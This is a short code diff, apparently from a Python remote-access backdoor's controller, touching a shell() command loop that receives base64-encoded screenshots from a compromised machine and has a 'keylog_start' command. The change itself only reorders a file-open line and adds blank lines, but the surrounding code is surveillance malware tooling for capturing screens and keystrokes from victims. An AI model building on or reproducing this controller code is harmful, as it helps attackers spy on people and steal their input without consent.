@@ -55,9 +55,9 @@ def shell():
 				result = "[!] File Not Found"
 				reliable_send(result)
 				
-		elif command [:10] == "screenshot":		
+		elif command [:10] == "screenshot":
+			screen = open("screenshot_" + str(count) + ".png", "wb")		
 			image = reliable_recv()
-			screen = open("screenshot_" + str(count) + ".png", "wb")
 			image_decoded = base64.b64decode(image)
 			try:
 				screen.write(image_decoded)
@@ -67,6 +67,8 @@ def shell():
 			except:
 				print(colored("[!] Can't took screenshot"))
 				os.remove("screenshot_" + str(count) + ".png")
+				
+				
 		
 		elif command[:12] == "keylog_start":
 			continue
